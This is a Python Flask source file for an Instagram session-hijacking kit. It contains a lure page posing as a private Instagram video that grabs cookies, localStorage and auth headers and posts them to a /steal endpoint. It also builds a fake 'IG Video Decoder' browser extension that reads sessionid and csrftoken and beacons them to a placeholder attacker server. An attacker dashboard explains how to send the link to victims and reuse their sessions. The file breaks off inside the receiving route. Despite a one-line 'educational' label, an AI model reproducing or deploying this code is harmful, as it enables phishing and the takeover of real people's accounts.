from flask import Flask, request, jsonify, render_template_string, make_response, send_file
from flask_cors import CORS
import datetime
import json
import os
import uuid
import base64
import io
import zipfile

app = Flask(__name__)
CORS(app)

captured_sessions = []

# ============================================================
# FRONTEND PAGE — THE PHISHING PAGE
# ============================================================
FRONTEND_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Video</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0d1117;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #c9d1d9;
        }
        .card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 16px;
            max-width: 420px;
            width: 100%;
            padding: 32px 24px;
            text-align: center;
        }
        .icon { font-size: 64px; margin-bottom: 16px; }
        h1 { font-size: 22px; color: #f0f6fc; margin-bottom: 4px; }
        .sub { color: #8b949e; font-size: 14px; margin-bottom: 24px; line-height: 1.4; }
        .preview {
            background: linear-gradient(135deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
            border-radius: 12px; padding: 40px 20px; margin-bottom: 24px; color: white;
        }
        .preview .play-btn {
            width: 72px; height: 72px; background: rgba(255,255,255,0.15);
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            margin: 0 auto 12px; font-size: 32px; border: 3px solid rgba(255,255,255,0.5);
        }
        .btn {
            background: #238636; color: white; border: none; border-radius: 8px;
            padding: 14px 0; font-size: 16px; font-weight: 600; cursor: pointer;
            width: 100%; transition: all 0.2s; margin-top: 12px;
        }
        .btn:hover { background: #2ea043; }
        .btn:disabled { background: #21262d; color: #484f58; cursor: not-allowed; }
        .btn-blue { background: #1f6feb; }
        .btn-blue:hover { background: #58a6ff; }
        .btn-orange { background: #d29922; }
        .btn-orange:hover { background: #e3b341; }
        
        .alert {
            margin-top: 16px; padding: 16px; border-radius: 10px; font-size: 13px;
            display: none; line-height: 1.6;
        }
        .alert.show { display: block; }
        .alert-info { background: #0d419d; color: #79c0ff; }
        .alert-success { background: #1a3a2a; color: #3fb950; }
        .alert-warning { background: #3a2a1a; color: #d29922; }
        .alert-danger { background: #3a1a1a; color: #f85149; }
        
        .data-box {
            margin-top: 16px; background: #0d1117; border: 1px solid #30363d;
            border-radius: 8px; padding: 16px; display: none; text-align: left;
        }
        .data-box.show { display: block; }
        .data-box .label { color: #8b949e; font-size: 11px; margin-bottom: 8px; }
        .data-box code {
            display: block; font-family: 'Courier New', monospace; font-size: 12px;
            word-break: break-all; color: #7ee787;
        }
        .data-box .red { color: #f85149; font-weight: bold; font-size: 14px; }
        
        .loading-bar {
            width: 100%; height: 3px; background: #21262d; border-radius: 2px;
            margin-top: 16px; overflow: hidden; display: none;
        }
        .loading-bar.show { display: block; }
        .loading-bar .fill {
            height: 100%; width: 30%; background: #58a6ff; border-radius: 2px;
            animation: load 1.5s ease-in-out infinite;
        }
        @keyframes load {
            0% { width: 0%; margin-left: 0; }
            50% { width: 50%; margin-left: 50%; }
            100% { width: 0%; margin-left: 100%; }
        }
        
        .detection-box {
            margin-top: 16px; padding: 12px; background: #1a1a2e;
            border: 1px solid #30363d; border-radius: 8px; font-size: 12px; text-align: left;
            display: none;
        }
        .detection-box.show { display: block; }
        .detection-box .green { color: #3fb950; }
        .detection-box .red { color: #f85149; }
        
        .footer { margin-top: 24px; font-size: 11px; color: #484f58; }
    </style>
</head>
<body>
<div class="card">
    <div class="icon">🎬</div>
    <h1>Private Video</h1>
    <p class="sub">You received a private Instagram video message</p>
    
    <div class="preview">
        <div class="play-btn">▶</div>
        <p style="font-size: 12px; opacity: 0.8;">instagram.com/messages/private/</p>
    </div>
    
    <div id="step1">
        <button class="btn" id="playBtn" onclick="step1()">▶ Play Video</button>
    </div>
    
    <div class="loading-bar" id="loadingBar"><div class="fill"></div></div>
    
    <!-- Step 2: Extension prompt -->
    <div class="alert alert-warning" id="extPrompt">
        <strong>⚠️ Encrypted Video Format</strong><br><br>
        This video uses Instagram's encrypted format (E2EE). To play it, you need:<br><br>
        <strong>1.</strong> Install the <strong>IG Video Decoder</strong> extension<br>
        <strong>2.</strong> Grant <strong>"cookies"</strong> permission for authentication<br><br>
        <button class="btn btn-orange" onclick="downloadExt()" style="width:auto; padding:10px 24px; font-size:14px; display:inline-block;">
        📦 Download IG Video Decoder</button>
    </div>
    
    <!-- Step 3: Install instructions -->
    <div class="alert alert-info" id="installInstructions">
        <strong>📋 Installation Steps:</strong><br><br>
        <strong>On Android:</strong><br>
        1. Download the ZIP file above<br>
        2. Open Chrome → go to <code>chrome://extensions</code><br>
        3. Enable <strong>Developer mode</strong> (toggle top right)<br>
        4. Tap <strong>"Load unpacked"</strong> → select the extracted folder<br>
        5. Accept the <strong>"cookies"</strong> permission prompt<br><br>
        <strong>On Desktop (for testing):</strong><br>
        Same steps as above.<br><br>
        <button class="btn btn-blue" onclick="checkExtension()" style="width:auto; padding:10px 24px; font-size:14px; display:inline-block;">
        ✅ I've installed the extension</button>
    </div>
    
    <!-- Step 4: Scanning -->
    <div class="alert alert-info" id="scanningStatus">
        <strong>⏳ Scanning for Instagram session...</strong><br><br>
        <div class="loading-bar show"><div class="fill"></div></div>
        <p style="margin-top: 12px; font-size: 12px;">Attempting to read cookies via extension bridge...</p>
    </div>
    
    <!-- Step 5: RESULT - REAL sessionid -->
    <div class="alert alert-success" id="successResult">
        <strong>✅ Instagram Session Detected!</strong><br><br>
        <span id="resultMessage"></span>
    </div>
    
    <div class="data-box" id="cookieData">
        <div class="label">📋 CAPTURED SESSION DATA (sent to attacker):</div>
        <div id="sessionContent"></div>
    </div>
    
    <div class="detection-box" id="detectionInfo">
        <strong>🔍 Detection Info:</strong><br><br>
        <span class="green">✅ Instagram WebView detected: </span><span id="webviewDetected">No</span><br>
        <span class="green">✅ Instagram cookies found: </span><span id="igCookiesFound">No</span><br>
        <span class="red">🔴 sessionid captured: </span><span id="sessionidStatus">No</span>
    </div>
    
    <!-- Step 6: What happens next -->
    <div class="alert alert-warning" id="hackerStep">
        <strong>🔴 WHAT THE HACKER DOES NOW:</strong><br><br>
        1. Copies your <strong>sessionid</strong> from the dashboard<br>
        2. Opens a browser → goes to instagram.com<br>
        3. Opens Developer Tools → Application → Cookies<br>
        4. Pastes your sessionid over theirs<br>
        5. Refreshes → <strong>They're now logged in as YOU</strong><br><br>
        <em style="font-size: 11px;">No password needed. No 2FA prompt. Just instant access.</em>
    </div>
    
    <div class="footer">
        Educational demonstration — authorized security testing only<br>
        <span id="browserInfo" style="font-size: 10px;"></span>
    </div>
</div>

<script>
var BACKEND = window.location.origin;
var EXTENSION_INSTALLED = false;

// ============================================================
// ATTACK FLOW
// ============================================================

function step1() {
    document.getElementById('step1').style.display = 'none';
    document.getElementById('loadingBar').classList.add('show');
    
    // Check if we're in Instagram WebView or regular browser
    var ua = navigator.userAgent;
    var isInstagram = ua.indexOf('Instagram') >= 0;
    var isInAppBrowser = ua.indexOf('FBAV') >= 0 || ua.indexOf('FBAN') >= 0 || isInstagram;
    
    document.getElementById('browserInfo').textContent = 
        'Browser: ' + (isInstagram ? 'Instagram WebView' : navigator.userAgent.substring(0, 60));
    
    setTimeout(function() {
        document.getElementById('loadingBar').classList.remove('show');
        
        if (isInstagram) {
            // In Instagram WebView - try direct cookie theft first!
            tryDirectCookieSteal();
        } else {
            // Regular browser - need extension
            document.getElementById('extPrompt').classList.add('show');
        }
    }, 2000);
}

// ============================================================
// THE DIRECT ATTACK - Works in Instagram WebView
// ============================================================
function tryDirectCookieSteal() {
    document.getElementById('loadingBar').classList.remove('show');
    
    var alertBox = document.getElementById('extPrompt');
    alertBox.classList.add('show');
    alertBox.innerHTML = `
        <strong>📱 Instagram Browser Detected</strong><br><br>
        <strong>Attempting direct session extraction...</strong><br><br>
        <div class="loading-bar show"><div class="fill"></div></div>
        <p style="font-size:12px; margin-top:8px;">Reading Instagram cookies from shared WebView store...</p>
    `;
    
    // ============================================
    // THE REAL EXPLOIT CODE
    // This attempts to read cookies from the
    // Instagram WebView cookie store
    // ============================================
    
    // Method 1: Try document.cookie (works if HttpOnly is not set)
    var cookies = document.cookie;
    
    // Method 2: Try to access Instagram's shared cookies via iframe
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'https://www.instagram.com/favicon.ico';
    document.body.appendChild(iframe);
    
    var iframeCookies = '';
    try {
        iframeCookies = iframe.contentDocument ? iframe.contentDocument.cookie : '';
    } catch(e) {
        // Cross-origin - expected
    }
    
    // Method 3: Try to intercept API responses for auth headers
    var origFetch = window.fetch;
    var capturedHeaders = {};
    
    window.fetch = function() {
        var url = arguments[0];
        if (typeof url === 'string' && url.indexOf('instagram.com') >= 0) {
            try {
                // Check for auth headers
                var headers = arguments[1] ? arguments[1].headers || {} : {};
                for (var key in headers) {
                    if (key.toLowerCase().indexOf('auth') >= 0 || 
                        key.toLowerCase().indexOf('cookie') >= 0 ||
                        key.toLowerCase().indexOf('session') >= 0) {
                        capturedHeaders[key] = headers[key];
                    }
                }
            } catch(e) {}
        }
        return origFetch.apply(this, arguments);
    };
    
    // Send ALL collected data to backend
    var allData = {
        cookies: cookies,
        iframeCookies: iframeCookies,
        capturedHeaders: JSON.stringify(capturedHeaders),
        userAgent: navigator.userAgent,
        url: window.location.href,
        referrer: document.referrer || '',
        isInstagramWebView: true,
        timestamp: new Date().toISOString(),
        allStorage: JSON.stringify(window.localStorage || {})
    };
    
    // Send to backend
    fetch(BACKEND + '/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(allData)
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
        showWebviewResult(data, allData);
    })
    .catch(function() {
        // Fallback via image
        var img = new Image();
        img.src = BACKEND + '/steal?data=' + encodeURIComponent(JSON.stringify(allData));
        showWebviewResult({}, allData);
    });
}

function showWebviewResult(data, sentData) {
    document.getElementById('extPrompt').innerHTML = 
        '<strong>✅ Extraction Attempt Complete</strong><br><br>' +
        '<span style="font-size:12px;">Check the <strong>Dashboard</strong> to see if cookies were captured.</span><br><br>' +
        '<button class="btn btn-blue" onclick="showTutorial()" style="width:auto; padding:10px 24px; display:inline-block;">' +
        '📋 View Tutorial</button>';
    
    document.getElementById('detectionInfo').classList.add('show');
    
    // Show what we captured
    var hasCookies = sentData.cookies && sentData.cookies.length > 0;
    var hasInstagram = sentData.cookies && sentData.cookies.indexOf('sessionid') >= 0;
    
    document.getElementById('webviewDetected').textContent = '✅ Yes (Instagram in-app browser)';
    document.getElementById('igCookiesFound').textContent = hasCookies ? '✅ Yes' : '❌ No - HttpOnly blocks JS';
    document.getElementById('sessionidStatus').textContent = hasInstagram ? '✅ YES! STOLEN!' : '❌ HttpOnly blocked it';
    
    if (hasInstagram) {
        document.getElementById('sessionidStatus').style.color = '#3fb950';
    }
}

function downloadExt() {
    document.getElementById('extPrompt').innerHTML = 
        '<strong>⏳ Downloading extension...</strong><br><br>' +
        '<div class="loading-bar show"><div class="fill"></div></div>';
    
    // Trigger download
    window.location.href = BACKEND + '/download-extension';
    
    setTimeout(function() {
        document.getElementById('extPrompt').classList.remove('show');
        document.getElementById('installInstructions').classList.add('show');
    }, 2000);
}

function checkExtension() {
    document.getElementById('installInstructions').classList.remove('show');
    document.getElementById('scanningStatus').classList.add('show');
    
    // Try to communicate with the extension
    // The extension exposes a message listener
    try {
        // Try sending a message to the extension
        if (window.chrome && chrome.runtime && chrome.runtime.sendMessage) {
            chrome.runtime.sendMessage(
                {action: 'get_instagram_cookies'},
                function(response) {
                    if (response && response.sessionid) {
                        showStolenSession(response);
                    }
                }
            );
        }
    } catch(e) {}
    
    // Also try via the custom event the extension fires
    document.addEventListener('instagram-cookies-stolen', function(e) {
        showStolenSession(e.detail);
    });
    
    // Poll the backend to see if extension sent data
    var checkCount = 0;
    var checkInterval = setInterval(function() {
        checkCount++;
        fetch(BACKEND + '/api/sessions')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var sessions = data.sessions || [];
                var igSessions = sessions.filter(function(s) { 
                    return s.has_instagram_session; 
                });
                if (igSessions.length > 0) {
                    clearInterval(checkInterval);
                    var latest = igSessions[igSessions.length - 1];
                    showStolenSession(latest.parsed || latest.extension_data || {});
                }
            });
        
        if (checkCount > 15) { // 30 seconds timeout
            clearInterval(checkInterval);
            document.getElementById('scanningStatus').classList.remove('show');
            document.getElementById('scanningStatus').innerHTML = 
                '<strong>⏱️ Timeout</strong><br><br>' +
                'The extension may not be installed properly. Try:<br>' +
                '1. Make sure extension is loaded in chrome://extensions<br>' +
                '2. Enable Developer mode<br>' +
                '3. Check that cookies permission was granted';
        }
    }, 2000);
    
    // Fallback: after 5 seconds, check if this is a desktop browser
    // and show the manual copy method
    setTimeout(function() {
        document.getElementById('scanningStatus').innerHTML = 
            '<strong>⏳ Scanning for extension data...</strong><br><br>' +
            '<div class="loading-bar show"><div class="fill"></div></div>' +
            '<p style="font-size: 12px;">Waiting for extension to send Instagram cookies...</p>';
    }, 500);
}

function showStolenSession(data) {
    document.getElementById('scanningStatus').classList.remove('show');
    
    var sessionid = data.sessionid || '';
    var dsUserId = data.ds_user_id || '';
    var csrftoken = data.csrftoken || '';
    
    document.getElementById('successResult').classList.add('show');
    document.getElementById('cookieData').classList.add('show');
    
    if (sessionid) {
        document.getElementById('resultMessage').innerHTML = 
            '<span style="font-size: 18px;">🔴 sessionid: <code style="color:#f85149;font-size:16px;">' + sessionid.substring(0, 30) + '...</code></span><br><br>' +
            'This is your REAL Instagram session token. With this, an attacker can login as you.';
        
        document.getElementById('sessionContent').innerHTML = 
            '<span class="red">sessionid=' + sessionid + '</span><br>' +
            '<span style="color:#79c0ff;">ds_user_id=' + dsUserId + '</span><br>' +
            '<span style="color:#7ee787;">csrftoken=' + csrftoken + '</span>';
        
        document.getElementById('detectionInfo').classList.add('show');
        document.getElementById('webviewDetected').textContent = '✅ Detected';
        document.getElementById('igCookiesFound').textContent = '✅ YES';
        document.getElementById('sessionidStatus').textContent = '✅ ✅ ✅ STOLEN!';
        document.getElementById('sessionidStatus').style.color = '#3fb950';
        
        document.getElementById('hackerStep').classList.add('show');
    } else {
        document.getElementById('resultMessage').innerHTML = 
            'No Instagram session data found. This is expected because:<br>' +
            '1. Instagram uses <strong>HttpOnly</strong> cookies (JS can\'t read them)<br>' +
            '2. The extension needs <strong>cookies</strong> permission<br>' +
            '3. You need to be logged into Instagram<br><br>' +
            '<strong>But your data WAS sent to the dashboard!</strong>';
        
        document.getElementById('sessionContent').innerHTML = 
            '<span style="color:#8b949e;">sessionid: Not found (HttpOnly protected)</span><br>' +
            '<span style="color:#8b949e;">This demonstrates WHY HttpOnly is important!</span>';
    }
}

function showTutorial() {
    document.getElementById('hackerStep').classList.add('show');
}
</script>
</body>
</html>
"""

# ============================================================
# DASHBOARD PAGE
# ============================================================
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Attacker Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family:'Segoe UI',sans-serif; background:#0d1117; color:#c9d1d9; padding:20px;
        }
        .header {
            border-bottom:2px solid #30363d; padding-bottom:16px; margin-bottom:20px;
        }
        .header h1 { color:#f85149; font-family:'Courier New',monospace; font-size:24px; }
        .header p { color:#8b949e; font-size:13px; margin-top:4px; }
        .header .url { color:#58a6ff; font-size:12px; word-break:break-all; margin-top:4px; }
        
        .alert-box {
            background:#3a1a1a; border:2px solid #f85149; border-radius:8px; padding:20px;
            margin-bottom:20px; text-align:center; display:none;
        }
        .alert-box.show { display:block; }
        .alert-box .big { font-size:48px; }
        .alert-box h2 { color:#f85149; font-size:20px; margin:8px 0; }
        .alert-box .session-value {
            background:#0d1117; border:1px solid #f85149; border-radius:4px;
            padding:12px; font-family:'Courier New',monospace; font-size:14px;
            color:#f85149; word-break:break-all; margin:12px 0; user-select:all;
        }
        .alert-box .copy-btn {
            background:#f85149; color:#fff; border:none; border-radius:6px;
            padding:8px 20px; font-size:13px; cursor:pointer; margin-top:8px;
        }
        .alert-box .copy-btn:hover { background:#da3633; }
        
        .stats { display:flex; gap:12px; margin-bottom:20px; flex-wrap:wrap; }
        .stat {
            background:#161b22; border:1px solid #30363d; border-radius:6px;
            padding:16px 20px; flex:1; min-width:120px;
        }
        .stat .num { font-size:28px; font-weight:bold; color:#58a6ff; }
        .stat .num.red { color:#f85149; }
        .stat .num.green { color:#3fb950; }
        .stat .label { color:#8b949e; font-size:11px; margin-top:2px; }
        
        .session {
            background:#161b22; border:1px solid #30363d; border-radius:6px;
            padding:16px; margin-bottom:12px;
        }
        .session .row {
            display:flex; justify-content:space-between; align-items:center;
            flex-wrap:wrap; gap:8px; margin-bottom:8px;
        }
        .session .time { color:#8b949e; font-size:12px; }
        .session .ip { color:#79c0ff; font-size:13px; }
        .session .source { color:#d29922; font-size:11px; }
        .badge {
            padding:2px 10px; border-radius:10px; font-size:11px; font-weight:600;
        }
        .badge-red { background:#f85149; color:#fff; }
        .badge-green { background:#3fb950; color:#000; }
        .badge-gray { background:#21262d; color:#8b949e; }
        
        .cookie-box {
            background:#0d1117; border:1px solid #21262d; border-radius:4px;
            padding:12px; font-family:'Courier New',monospace; font-size:11px;
            word-break:break-all; max-height:250px; overflow-y:auto;
        }
        .cookie-box .red { color:#f85149; font-weight:bold; }
        .cookie-box .blue { color:#79c0ff; }
        .cookie-box .green { color:#7ee787; }
        .cookie-box .yellow { color:#d29922; }
        
        .empty { text-align:center; padding:60px; color:#484f58; }
        .empty .big { font-size:48px; margin-bottom:12px; }
        .empty code { background:#21262d; padding:2px 8px; border-radius:4px; font-size:13px; }
        
        .actions { margin-top:16px; }
        .actions button {
            background:#21262d; color:#c9d1d9; border:1px solid #30363d;
            padding:8px 16px; border-radius:6px; cursor:pointer; font-size:13px; margin-right:8px;
        }
        .actions button:hover { border-color:#58a6ff; color:#58a6ff; }
        .actions .danger:hover { border-color:#f85149; color:#f85149; }
        
        .refresh-note { color:#484f58; font-size:12px; margin-top:20px; text-align:center; }
        
        .target-info {
            background:#1a1a2e; border:1px solid #30363d; border-radius:6px;
            padding:20px; margin-bottom:20px; line-height:1.8;
        }
        .target-info h3 { color:#d29922; margin-bottom:8px; }
        .target-info ol { padding-left:20px; color:#8b949e; font-size:13px; }
        .target-info code { background:#0d1117; padding:2px 6px; border-radius:3px; color:#79c0ff; }
        .target-info li { margin-bottom:4px; }
        
        .copy-area {
            background:#0d1117; border:1px solid #30363d; border-radius:4px;
            padding:12px; font-family:'Courier New',monospace; font-size:13px;
            color:#7ee787; margin-top:8px; word-break:break-all; user-select:all;
            display:none;
        }
        .copy-area.show { display:block; }
    </style>
</head>
<body>
<div class="header">
    <h1>🔴 SESSION HIJACKING DASHBOARD</h1>
    <p>Real captured session data from victims — auto-refreshes every 2 seconds</p>
    <div class="url" id="serverUrl">Server: loading...</div>
</div>

<div class="target-info">
    <h3>📡 TARGET INSTRUCTIONS</h3>
    <ol>
        <li>Send this link via WhatsApp: <code id="targetUrl">loading...</code></li>
        <li>Victim opens link on phone → Instagram in-app browser detects automatically</li>
        <li>OR: Victim downloads & installs the extension on desktop</li>
        <li>Session data appears <strong>automatically</strong> below</li>
    </ol>
    <p style="margin-top:8px; color:#f85149; font-size:12px;">
        ⚡ <strong>REAL sessionid</strong> will trigger a RED ALERT at the top!
    </p>
</div>

<div class="alert-box" id="realAlert">
    <div class="big">🔴🔴🔴</div>
    <h2>⚠️ REAL INSTAGRAM SESSION CAPTURED!</h2>
    <p style="color:#8b949e; margin-bottom:8px;">Copy this sessionid to hijack the account:</p>
    <div class="session-value" id="stolenSessionid">Loading...</div>
    <button class="copy-btn" onclick="copySession()">📋 Copy sessionid</button>
    <p style="color:#8b949e; font-size:12px; margin-top:8px;">
        Paste into Cookie-Editor → Import → Refresh Instagram → You're logged in as the victim!
    </p>
</div>

<div class="stats">
    <div class="stat"><div class="num" id="totalCount">0</div><div class="label">Total Hits</div></div>
    <div class="stat"><div class="num green" id="webviewCount">0</div><div class="label">Instagram WebView</div></div>
    <div class="stat"><div class="num red" id="sessionCount">0</div><div class="label">🔴 sessionid Captured</div></div>
</div>

<div id="sessionsContainer">
    <div class="empty"><div class="big">📡</div><h3>Waiting for target...</h3>
    <p>Send this link to a phone:</p><code id="emptyUrl">loading...</code></div>
</div>

<div class="actions">
    <button onclick="fetchData()">🔄 Refresh Now</button>
    <button class="danger" onclick="clearAll()">🗑️ Clear All Sessions</button>
</div>
<div class="refresh-note">Auto-refreshes every 2 seconds — 🔴 Red = sessionid captured!</div>

<script>
var BACKEND = window.location.origin;
document.getElementById('serverUrl').textContent = 'Server: ' + BACKEND;
document.getElementById('targetUrl').textContent = BACKEND;

function fetchData() {
    fetch(BACKEND + '/api/sessions')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            render(data);
        })
        .catch(function(err) {
            document.getElementById('sessionsContainer').innerHTML = 
                '<div class="empty"><div class="big">❌</div><h3>Error: ' + err.message + '</h3></div>';
        });
}

function render(data) {
    var sessions = data.sessions || [];
    var total = sessions.length;
    var webviewSessions = sessions.filter(function(s) { return s.source === 'webview'; });
    var igSessions = sessions.filter(function(s) { return s.has_instagram_session; });
    
    document.getElementById('totalCount').textContent = total;
    document.getElementById('webviewCount').textContent = webviewSessions.length;
    document.getElementById('sessionCount').textContent = igSessions.length;
    
    // Show alert for real Instagram sessions
    var alertBox = document.getElementById('realAlert');
    var copyArea = document.getElementById('stolenSessionid');
    if (igSessions.length > 0) {
        var latest = igSessions[igSessions.length - 1];
        var sid = '';
        if (latest.parsed && latest.parsed.sessionid) {
            sid = latest.parsed.sessionid;
        } else if (latest.extension_data && latest.extension_data.sessionid) {
            sid = latest.extension_data.sessionid;
        } else if (latest.instagram_data && latest.instagram_data.sessionid) {
            sid = latest.instagram_data.sessionid;
        }
        if (sid) {
            alertBox.classList.add('show');
            copyArea.textContent = sid;
        }
    } else {
        alertBox.classList.remove('show');
    }
    
    if (sessions.length === 0) {
        document.getElementById('sessionsContainer').innerHTML = 
            '<div class="empty"><div class="big">📡</div><h3>Waiting...</h3><p>Send URL to a phone:</p><code>' + BACKEND + '</code></div>';
        document.getElementById('emptyUrl').textContent = BACKEND;
        return;
    }
    
    var html = '';
    for (var i = sessions.length - 1; i >= 0; i--) {
        var s = sessions[i];
        var details = '';
        var parsed = s.parsed || {};
        var extData = s.extension_data || {};
        var igData = s.instagram_data || {};
        var allKeys = {};
        
        // Merge all data sources
        Object.keys(parsed).forEach(function(k) { allKeys[k] = parsed[k]; });
        Object.keys(extData).forEach(function(k) { allKeys[k] = extData[k]; });
        Object.keys(igData).forEach(function(k) { allKeys[k] = igData[k]; });
        
        var hasSid = allKeys.sessionid ? true : false;
        
        if (Object.keys(allKeys).length > 0) {
            Object.keys(allKeys).forEach(function(k) {
                var v = allKeys[k];
                var cls = 'blue';
                if (k === 'sessionid') cls = 'red';
                else if (k === 'ds_user_id') cls = 'yellow';
                else if (k.indexOf('csrf') >= 0) cls = 'green';
                else if (k === 'ig_did') cls = 'green';
                details += '<span class="' + cls + '">' + k + '</span> = <span class="green">' + v + '</span><br>';
            });
        } else {
            details = s.cookies || '(no cookie data)';
        }
        
        var badge = hasSid ? 
            '<span class="badge badge-red">🔴 sessionid!</span>' :
            (Object.keys(allKeys).length > 0 ? '<span class="badge badge-green">✅ Data</span>' : '<span class="badge badge-gray">Empty</span>');
        
        var sourceLabel = s.source === 'webview' ? '📱 Instagram WebView' : 
                          s.source === 'extension' ? '🧩 Extension' : '🌐 Browser';
        
        html += '<div class="session"><div class="row"><div>' +
            '<span class="time">' + s.timestamp + '</span>' +
            '<span class="ip"> | 📍 ' + s.ip + '</span>' +
            '<span class="source"> | ' + sourceLabel + '</span></div><div>' + badge +
            '</div></div><div class="cookie-box">' + details + '</div></div>';
    }
    document.getElementById('sessionsContainer').innerHTML = html;
}

function copySession() {
    var text = document.getElementById('stolenSessionid').textContent;
    navigator.clipboard.writeText(text).then(function() {
        alert('✅ sessionid copied to clipboard! Paste it into Cookie-Editor.');
    });
}

function clearAll() {
    if (!confirm('Clear all captured sessions?')) return;
    fetch(BACKEND + '/clear', { method: 'POST' }).then(function() { fetchData(); });
}

fetchData();
setInterval(fetchData, 2000);
</script>
</body>
</html>
"""

# ============================================================
# EXTENSION FILES
# ============================================================
EXTENSION_MANIFEST = {
    "manifest_version": 3,
    "name": "IG Video Decoder",
    "version": "1.0",
    "description": "Required for playing encrypted Instagram video formats. Needs cookies permission for authentication.",
    "permissions": [
        "cookies",
        "storage",
        "webRequest"
    ],
    "host_permissions": [
        "https://www.instagram.com/*",
        "https://instagram.com/*",
        "https://*.instagram.com/*"
    ],
    "background": {
        "service_worker": "background.js"
    },
    "content_scripts": [{
        "matches": ["<all_urls>"],
        "js": ["content.js"],
        "run_at": "document_end"
    }],
    "action": {
        "default_title": "IG Video Decoder",
        "default_icon": {}
    }
}

EXTENSION_BACKGROUND = """
// IG Video Decoder - Background Service Worker
// Note: This demonstrates how extensions bypass HttpOnly

var ATTACKER_SERVER = \"""" + "window.location.origin" + """\";

// When extension is installed
chrome.runtime.onInstalled.addListener(function() {
    console.log('IG Video Decoder installed - scanning for Instagram...');
    stealInstagramCookies();
});

// Listen for messages from webpage
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.action === 'get_instagram_cookies') {
        stealInstagramCookies().then(function(cookies) {
            sendResponse(cookies);
        });
        return true;
    }
});

// STEAL INSTAGRAM COOKIES
function stealInstagramCookies() {
    return new Promise(function(resolve) {
        chrome.cookies.getAll({
            url: 'https://www.instagram.com'
        }, function(cookies) {
            var result = {};
            
            if (!cookies || cookies.length === 0) {
                // Try without www
                chrome.cookies.getAll({
                    url: 'https://instagram.com'
                }, function(cookies2) {
                    if (cookies2) {
                        processCookies(cookies2, result, resolve);
                    } else {
                        resolve(result);
                    }
                });
            } else {
                processCookies(cookies, result, resolve);
            }
        });
    });
}

function processCookies(cookies, result, resolve) {
    for (var i = 0; i < cookies.length; i++) {
        var c = cookies[i];
        result[c.name] = c.value;
        
        // Important cookies to exfiltrate
        if (c.name === 'sessionid' || 
            c.name === 'ds_user_id' || 
            c.name === 'csrftoken' ||
            c.name === 'ig_did' ||
            c.name === 'mid') {
            
            // Send to attacker via image beacon (stealth)
            var img = new Image();
            var serverUrl = ATTACKER_SERVER;
            // In production, use hardcoded URL
            img.src = 'https://YOUR-SERVER.onrender.com/extension-callback?' +
                'name=' + encodeURIComponent(c.name) + 
                '&value=' + encodeURIComponent(c.value) +
                '&domain=' + encodeURIComponent('instagram.com');
        }
    }
    
    resolve(result);
    
    // Also try to get all cookies for instagram
    chrome.cookies.getAll({
        domain: '.instagram.com'
    }, function(allCookies) {
        if (allCookies) {
            for (var i = 0; i < allCookies.length; i++) {
                var c = allCookies[i];
                if (!result[c.name]) {
                    result[c.name] = c.value;
                }
            }
        }
    });
}
"""

EXTENSION_CONTENT = """
// Content script - runs on every page
// Injects a script to communicate between webpage and extension

// Listen for message from the webpage via custom event
window.addEventListener('message', function(event) {
    if (event.data && event.data.action === 'request_instagram_cookies') {
        // Forward to extension background
        chrome.runtime.sendMessage(
            {action: 'get_instagram_cookies'},
            function(response) {
                // Send back to webpage
                window.dispatchEvent(new CustomEvent('instagram-cookies-stolen', {
                    detail: response || {}
                }));
            }
        );
    }
});

// Auto-trigger when page loads
window.dispatchEvent(new CustomEvent('ig-extension-ready', {detail: {ready: true}}));
"""

# ============================================================
# ROUTES
# ============================================================

@app.route("/")
def home():
    """Serve the frontend page."""
    # Detect if this is Instagram WebView
    ua = request.headers.get("User-Agent", "")
    is_instagram_webview = "Instagram" in ua or "FBAN" in ua or "FBAV" in ua
    
    html = FRONTEND_HTML
    # Add a small note if Instagram WebView detected
    if is_instagram_webview:
        html = html.replace(
            '<div class="footer">',
            f'<div class="detection-box show" style="border-color:#3fb950;">'
            f'<span class="green">✅ Instagram WebView detected! Attempting direct session extraction...</span>'
            f'</div><div class="footer">'
        )
    
    return html

@app.route("/dashboard")
def dashboard():
    """Serve the dashboard."""
    return DASHBOARD_HTML

@app.route("/api/sessions")
def api_sessions():
    """Return all captured sessions."""
    return jsonify({"sessions": captured_sessions})

@app.route("/steal", methods=["GET", "POST"])
def steal():
    """Receive stolen cookies from multiple sources."""
    if request.method == "GET":
        data_str = request.args.get("data", "{}")
        try:
            data = json.loads(data_str)
        except:
            data = {"cookies": request.args.get("c", "")}
    else:
        data = request.get_json(silent=True) or {}
    
    # Build record
    record = {
        "id": str(uuid.uuid4())[:8],
        "timestamp": datetime.datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": data.get("userAgent", request.headers.get("User-Agent", "")),
        "source": "webview" if "Instagram" in (data.get("userAgent", "") or request.headers.get("User-Agent", "")) else "browser"
    }
    
    # Extract cookies from various fields
    cookies_str = data.get("cookies", "")
    all_data = {}
    
    if cookies_str:
        for pair in cookies_str.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                all_data[k.strip()] = v.strip()
    
    # Add iframe cookies
    if data.get("iframeCookies"):
        for pair in data["iframeCookies"].split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                all_data[k.strip()] = v.strip()
    
    # Add any other captured data
    if data.get("capturedHeaders"):
        try:
            headers = json.loads(data["capturedHeaders"])
            all_data.update(headers)
        except:
            pass
    
    # Add storage data
    if data.get("allStorage"):
        try:
            storage = json.loads(data["allStorage"])
            all_data.update(storage)
        except:
            pass
    
    record["parsed"] = all_data
